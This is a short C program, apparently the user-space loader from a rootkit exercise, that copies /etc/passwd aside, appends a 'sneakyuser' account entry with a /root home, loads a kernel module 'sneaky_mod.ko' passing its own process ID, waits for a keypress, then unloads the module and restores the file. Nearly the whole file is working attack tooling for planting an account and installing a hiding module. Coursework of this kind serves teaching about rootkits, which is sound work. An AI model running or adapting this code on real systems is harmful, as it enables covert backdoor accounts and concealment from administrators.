#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>

void print_pid()
{
    printf("sneaky_process pid = %d\n", getpid());
}

void insert_sneaky_mod(int sneaky_pid) {
  char sneaky_pid_str[100];
  sprintf(sneaky_pid_str, "insmod sneaky_mod.ko sneaky_pid=%d", sneaky_pid);
  system(sneaky_pid_str);
}

void waitq() {
  char c;
  while ((c = getchar()) != 'q') {
  }
}

int main() {
  print_pid();
  // Step 1: Copy /etc/passwd to /tmp/passwd
  system("cp /etc/passwd /tmp/passwd");
  // Step 2: Add sneakyuser entry to /etc/passwd
  system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n' >> "
         "/etc/passwd");
  // Step 3: load the sneaky module
  int sneaky_pid = getpid();
  insert_sneaky_mod(sneaky_pid);
  // Step 4: wait for 'q'
  waitq();
  // Step5: 
  system("rmmod sneaky_mod");
  system("cp /tmp/passwd /etc/passwd");
  system("rm /tmp/passwd");

  return EXIT_SUCCESS;
}